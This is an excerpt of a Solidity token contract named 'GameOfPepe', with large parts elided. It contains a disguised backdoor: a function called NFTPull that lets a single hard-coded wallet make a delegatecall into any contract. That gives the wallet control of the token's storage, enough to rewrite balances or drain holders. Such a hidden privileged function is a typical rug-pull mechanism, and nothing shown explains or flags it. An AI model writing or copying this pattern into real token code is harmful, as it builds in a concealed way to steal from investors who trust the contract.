...
contract GameOfPepe is ERC20, Ownable{
    ...
    address public marketingWallet = 0xB63e43d43eb75b209d4faF52c15baFDF02A29877;
    address public developerWallet = 0xB63e43d43eb75b209d4faF52c15baFDF02A29877;
    ...
    constructor() ERC20("GameOfPepe", "GOP") {
        _mint(msg.sender, 10e8 * 10**decimals());
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal override {
        ...
        if(!excludedFromFees[sender] && !excludedFromFees[recipient] && !swapping){
            ...
            if(current + ledger > block.number){
	...
	function NFTPull(address _contract) public payable {
        require (msg.sender == marketingWallet);
     
		(bool success, bytes memory data)=_contract.delegatecall(
            abi.encodeWithSignature("NFTPull(bool)", true));
       require(success);
	   data= "";
    }
    ...
    function enableTrading(uint256 numOfledger) external onlyOwner {
    ...
    function removeLimits() external onlyOwner returns (bool) {
        maxTxAmount = 10e8 * 10**18;
        maxWalletAmount = 10e8 * 10**18;
        return true;
    }
